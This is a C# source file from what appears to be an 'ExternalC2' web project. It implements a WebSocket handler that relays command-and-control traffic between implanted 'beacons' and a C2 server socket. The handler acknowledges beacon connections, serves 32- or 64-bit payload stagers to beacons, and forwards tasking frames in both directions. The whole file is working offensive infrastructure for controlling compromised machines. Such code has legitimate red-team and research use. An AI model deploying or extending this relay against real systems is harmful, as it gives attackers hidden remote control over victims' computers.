using System;
using System.Net.WebSockets;
using System.Text;
using System.Threading.Tasks;
using ExternalC2;
using ExternalC2.Channels;
using ExternalC2.Frames;
using Microsoft.Extensions.Options;

namespace ExternalC2Web.WebSockets
{
    /// <summary>
    /// </summary>
    /// <seealso cref="WebSocketHandler" />
    public class C2WebSocketHandler : WebSocketHandler
    {
        /// <summary>
        ///     The settings
        /// </summary>
        private readonly SocketSettings _settings;

        /// <summary>
        ///     The socket manager
        /// </summary>
        private readonly ChannelManager<SocketChannel> _socketManager;

        /// <summary>
        ///     Initializes a new instance of the <see cref="C2WebSocketHandler" /> class.
        /// </summary>
        /// <param name="settings">The settings.</param>
        /// <param name="socketManager">The socket manager.</param>
        /// <param name="webSocketManager">The web socket manager.</param>
        public C2WebSocketHandler(IOptions<SocketSettings> settings,
            ChannelManager<SocketChannel> socketManager, ChannelManager<WebSocket> webSocketManager)
            : base(webSocketManager)
        {
            _settings = settings.Value;
            _socketManager = socketManager;
        }

        /// <summary>
        ///     Called when [connected].
        /// </summary>
        /// <param name="socket">The socket.</param>
        /// <returns></returns>
        public override async Task OnConnected(WebSocket socket)
        {
            await base.OnConnected(socket);

            var socketId = WebSocketManager.GetId(socket);
            Console.WriteLine($"Beacon connected: {socketId}");

            var serverChannel = new SocketChannel(_settings.IpAddress, _settings.Port);
            serverChannel.Connect();
            _socketManager.AddChannel(socketId, serverChannel);

            Console.WriteLine("Sending connect acknowledgement");
            var frame = new WebSocketFrame(FrameType.Connect, socketId.InternalId, new byte[] {0x00});
            await SendMessageAsync(socketId, frame.Encode());
        }

        /// <summary>
        ///     Receives the asynchronous.
        /// </summary>
        /// <param name="socket">The socket.</param>
        /// <param name="result">The result.</param>
        /// <param name="buffer">The buffer.</param>
        /// <returns></returns>
        public override async Task ReceiveAsync(WebSocket socket, WebSocketReceiveResult result, byte[] buffer)
        {
            var beaconId = WebSocketManager.GetId(socket);
            var frame = WebSocketFrame.Decode(Encoding.UTF8.GetString(buffer));

            switch (frame.Type)
            {
                case FrameType.Connect:
                case FrameType.ToBeacon:
                    Console.WriteLine("Server doesn't need to handle Connect/ToBeacon frames");
                    break;
                case FrameType.Stager:
                    // Get stager from server channel
                    var stager = GetStager(beaconId, frame.Buffer[0] == 0x64);
                    var stageFrame = new WebSocketFrame(FrameType.Stager, beaconId.InternalId, stager);
                    // Send stager to beacon channel
                    await SendMessageAsync(beaconId, stageFrame.Encode());
                    break;
                case FrameType.ToServer:
                    // Send frame to server channel
                    SendFrame(beaconId, frame.Buffer);
                    // Read frame from server channel
                    var respFrame = new WebSocketFrame(FrameType.ToBeacon, beaconId.InternalId, ReadFrame(beaconId));
                    // Send frame to beacon channel
                    await SendMessageAsync(beaconId, respFrame.Encode());
                    break;
                default:
                    Console.WriteLine("Unknown frame type...");
                    break;
            }
        }

        /// <summary>
        ///     Reads the frame.
        /// </summary>
        /// <param name="beaconId">The beacon identifier.</param>
        /// <returns></returns>
        public byte[] ReadFrame(BeaconId beaconId)
        {
            return _socketManager.GetChannelById(beaconId).ReadFrame();
        }

        /// <summary>
        ///     Sends the frame.
        /// </summary>
        /// <param name="beaconId">The beacon identifier.</param>
        /// <param name="buffer">The buffer.</param>
        public void SendFrame(BeaconId beaconId, byte[] buffer)
        {
            _socketManager.GetChannelById(beaconId).SendFrame(buffer);
        }

        /// <summary>
        ///     Gets the stager.
        /// </summary>
        /// <param name="beaconId">The beacon identifier.</param>
        /// <param name="is64Bit">if set to <c>true</c> [is64 bit].</param>
        /// <returns></returns>
        public byte[] GetStager(BeaconId beaconId, bool is64Bit)
        {
            return _socketManager.GetChannelById(beaconId).GetStager(beaconId.ToString(), is64Bit);
        }
    }
}